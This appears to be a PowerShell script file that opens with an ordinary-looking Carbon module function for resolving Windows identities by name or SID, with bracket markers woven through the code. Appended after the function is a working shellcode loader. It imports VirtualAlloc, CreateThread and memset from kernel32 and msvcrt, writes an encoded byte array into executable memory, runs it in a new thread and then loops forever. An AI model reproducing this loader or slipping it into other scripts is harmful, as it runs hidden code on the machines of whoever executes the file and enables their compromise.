

 -||-> function Resolve-CIdentity
{
    
    [CmdletBinding(DefaultParameterSetName='ByName')]
    [OutputType([Carbon.Identity])]
    param(
        [Parameter(Mandatory=$true,ParameterSetName='ByName',Position=0)]
        [string]
        
        $Name,

        [Parameter(Mandatory=$true,ParameterSetName='BySid')]
        
        $SID
    )

     -||-> Set-StrictMode -Version 'Latest' <-||- 

     -||-> Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState <-||- 
    
     -||-> if(  -||-> $PSCmdlet.ParameterSetName -eq 'BySid' <-||-  )
    {
         -||-> $SID =  -||-> ConvertTo-CSecurityIdentifier -SID $SID <-||-  <-||- 
         -||-> if(  -||-> -not $SID <-||-  )
        {
            return
        } <-||- 

         -||-> $id = [Carbon.Identity]::FindBySid( $SID ) <-||- 
         -||-> if(  -||-> -not $id <-||-  )
        {
             -||-> Write-Error ( -||-> 'Identity ''{0}'' not found.' -f $SID <-||- ) -ErrorAction $ErrorActionPreference <-||- 
        } <-||- 
        return  -||-> $id <-||- 
    } <-||- 
    
     -||-> if(  -||-> -not ( -||-> Test-CIdentity -Name $Name <-||- ) <-||-  )
    {
         -||-> Write-Error ( -||-> 'Identity ''{0}'' not found.' -f $Name <-||- ) -ErrorAction $ErrorActionPreference <-||- 
        return
    } <-||- 

    return  -||-> [Carbon.Identity]::FindByName( $Name ) <-||-  
} <-||- 


 -||-> $EuZ = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $EuZ -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xb8,0x44,0xb3,0x04,0x1d,0xd9,0xe1,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x47,0x31,0x43,0x13,0x83,0xc3,0x04,0x03,0x43,0x4b,0x51,0xf1,0xe1,0xbb,0x17,0xfa,0x19,0x3b,0x78,0x72,0xfc,0x0a,0xb8,0xe0,0x74,0x3c,0x08,0x62,0xd8,0xb0,0xe3,0x26,0xc9,0x43,0x81,0xee,0xfe,0xe4,0x2c,0xc9,0x31,0xf5,0x1d,0x29,0x53,0x75,0x5c,0x7e,0xb3,0x44,0xaf,0x73,0xb2,0x81,0xd2,0x7e,0xe6,0x5a,0x98,0x2d,0x17,0xef,0xd4,0xed,0x9c,0xa3,0xf9,0x75,0x40,0x73,0xfb,0x54,0xd7,0x08,0xa2,0x76,0xd9,0xdd,0xde,0x3e,0xc1,0x02,0xda,0x89,0x7a,0xf0,0x90,0x0b,0xab,0xc9,0x59,0xa7,0x92,0xe6,0xab,0xb9,0xd3,0xc0,0x53,0xcc,0x2d,0x33,0xe9,0xd7,0xe9,0x4e,0x35,0x5d,0xea,0xe8,0xbe,0xc5,0xd6,0x09,0x12,0x93,0x9d,0x05,0xdf,0xd7,0xfa,0x09,0xde,0x34,0x71,0x35,0x6b,0xbb,0x56,0xbc,0x2f,0x98,0x72,0xe5,0xf4,0x81,0x23,0x43,0x5a,0xbd,0x34,0x2c,0x03,0x1b,0x3e,0xc0,0x50,0x16,0x1d,0x8c,0x95,0x1b,0x9e,0x4c,0xb2,0x2c,0xed,0x7e,0x1d,0x87,0x79,0x32,0xd6,0x01,0x7d,0x35,0xcd,0xf6,0x11,0xc8,0xee,0x06,0x3b,0x0e,0xba,0x56,0x53,0xa7,0xc3,0x3c,0xa3,0x48,0x16,0x92,0xf3,0xe6,0xc9,0x53,0xa4,0x46,0xba,0x3b,0xae,0x49,0xe5,0x5c,0xd1,0x80,0x8e,0xf7,0x2b,0x42,0x71,0xaf,0x64,0x00,0x19,0xb2,0x84,0x35,0x89,0x3b,0x62,0x5f,0x3d,0x6a,0x3c,0xf7,0xa4,0x37,0xb6,0x66,0x28,0xe2,0xb2,0xa8,0xa2,0x01,0x42,0x66,0x43,0x6f,0x50,0x1e,0xa3,0x3a,0x0a,0x88,0xbc,0x90,0x21,0x34,0x29,0x1f,0xe0,0x63,0xc5,0x1d,0xd5,0x43,0x4a,0xdd,0x30,0xd8,0x43,0x4b,0xfb,0xb6,0xab,0x9b,0xfb,0x46,0xfa,0xf1,0xfb,0x2e,0x5a,0xa2,0xaf,0x4b,0xa5,0x7f,0xdc,0xc0,0x30,0x80,0xb5,0xb5,0x93,0xe8,0x3b,0xe0,0xd4,0xb6,0xc4,0xc7,0xe4,0x8b,0x12,0x21,0x93,0xe5,0xa6 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $IPR=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $IPR.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$IPR,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



